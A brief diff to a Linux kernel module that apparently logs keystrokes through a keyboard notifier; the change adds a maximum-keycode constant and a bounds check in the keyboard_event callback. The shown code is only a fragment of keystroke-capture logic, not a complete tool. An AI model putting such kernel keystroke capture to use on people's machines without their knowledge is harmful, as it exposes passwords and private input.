@@ -21,6 +21,8 @@ static DEFINE_SPINLOCK(log_spinlock);
 
 static atomic_t	device_opened = ATOMIC_INIT(0);
 
+#define MAX_KEYS_SUPPORTED 119
+
 static int	dni_open(struct inode *inode, struct file *file)
 {
 	if (atomic_cmpxchg(&device_opened, 0, 1))
@@ -93,6 +95,8 @@ static int	keyboard_event(struct notifier_block *nb, unsigned long action, void 
 	struct s_keystroke		*stroke;
 	unsigned long			flags;
 
+	if (param->value > MAX_KEYS_SUPPORTED)
+		return NOTIFY_OK;
 	stroke = kmalloc(sizeof(struct s_keystroke), GFP_ATOMIC);
 	if (!stroke || action != KBD_KEYCODE)
 		return kfree(stroke), NOTIFY_OK;
